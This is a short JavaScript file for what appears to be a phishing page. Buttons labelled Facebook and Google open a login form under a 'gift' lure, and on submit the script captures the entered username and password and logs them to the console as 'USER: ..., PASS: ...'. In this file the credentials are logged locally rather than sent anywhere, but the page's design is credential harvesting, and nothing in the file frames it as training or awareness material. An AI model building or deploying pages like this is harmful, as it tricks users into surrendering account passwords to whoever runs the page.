document.addEventListener('DOMContentLoaded', () => {

const formLogin = document.getElementById('loginForm');
const facebookButton = document.getElementById('facebook');
const googleButton = document.getElementById('google');
const finalMessage = document.getElementById('finalMessage');
const giftMessage = document.getElementById('giftMessage');

facebookButton.addEventListener('click', () => {
    formLogin.style.display = 'flex';
    facebookButton.style.display = 'none';
    googleButton.style.display = 'none';
});

googleButton.addEventListener('click', () => {
    formLogin.style.display = 'flex';
    facebookButton.style.display = 'none';
    googleButton.style.display = 'none';
});

formLogin.addEventListener('submit', (e) => {
    e.preventDefault();
    const loginValue = document.getElementById('login').value;
    const passwordValue = document.getElementById('password').value;
    console.log(`USER: ${loginValue}, PASS: ${passwordValue}`)
    finalMessage.style.display = 'flex';
    formLogin.style.display = 'none';
    giftMessage.style.display = 'none';
});
})